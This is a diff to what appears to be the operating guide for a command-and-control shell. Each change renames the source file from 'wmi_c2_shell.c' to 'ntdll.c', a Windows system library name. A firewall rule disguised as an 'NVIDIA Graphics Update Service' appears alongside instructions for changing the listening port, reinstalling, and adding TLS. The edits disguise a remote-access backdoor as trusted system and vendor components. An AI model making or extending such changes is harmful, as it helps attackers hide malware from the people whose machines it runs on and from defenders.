@@ -355,7 +355,7 @@ netstat -anob | findstr ":443"
 ```
 
 **Solution:**
-- Edit `wmi_c2_shell.c` and change `#define LISTEN_PORT 443` to a different port
+- Edit `ntdll.c` and change `#define LISTEN_PORT 443` to a different port
 - Recompile and reinstall
 - Update firewall rule and client scripts
 
@@ -434,7 +434,7 @@ Get-NetFirewallRule -DisplayName "NVIDIA Graphics Update Service"
 ## ADVANCED CUSTOMIZATION
 
 ### Change Port
-Edit `wmi_c2_shell.c`:
+Edit `ntdll.c`:
 ```c
 #define LISTEN_PORT 443  // Change to desired port
 ```
@@ -448,4 +448,4 @@ $ExecutableName = "your_name.exe"
 ```
 
 ### Add TLS Encryption
-Modify `wmi_c2_shell.c` to use `schannel.h` for full SSL/TLS support (see stub functions included).
+Modify `ntdll.c` to use `schannel.h` for full SSL/TLS support (see stub functions included).
